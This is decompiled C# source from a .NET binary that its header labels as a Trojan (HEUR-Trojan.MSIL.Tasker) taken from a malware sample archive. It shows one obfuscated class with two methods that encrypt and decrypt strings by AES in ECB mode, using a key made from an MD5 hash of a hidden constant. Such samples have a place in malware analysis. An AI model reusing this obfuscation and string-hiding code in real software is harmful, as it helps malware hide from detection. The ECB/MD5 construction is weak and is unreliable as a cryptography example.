// Decompiled with JetBrains decompiler
// Type: 繼承澤顧澤的官生顧城將人.她顧使金太
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Security.Cryptography;
using 金使孫人尊導成繼的金;
using 金席行商她;

namespace 繼承澤顧澤的官生顧城將人
{
  public class 她顧使金太
  {
    public static object 城澤生的的席的(string 尊顧繼管人商)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      object base64String;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(命澤成的敬太.公顧的的澤(管導行官玉.首的席顧商城行望她司的金引));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor();
        byte[] numArray = 命澤成的敬太.公顧的的澤(尊顧繼管人商);
        byte[] inputBuffer = numArray;
        int length = numArray.Length;
        base64String = (object) Convert.ToBase64String(encryptor.TransformFinalBlock(inputBuffer, 0, length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return base64String;
    }

    public static object 人商顧的將(string 城執管命的望的管的執導望太繼)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      object obj;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(命澤成的敬太.公顧的的澤(管導行官玉.首的席顧商城行望她司的金引));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] numArray = Convert.FromBase64String(城執管命的望的管的執導望太繼);
        byte[] inputBuffer = numArray;
        int length = numArray.Length;
        obj = (object) 命澤成的敬太.澤成將希商使金成是承的承成(decryptor.TransformFinalBlock(inputBuffer, 0, length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return obj;
    }
  }
}
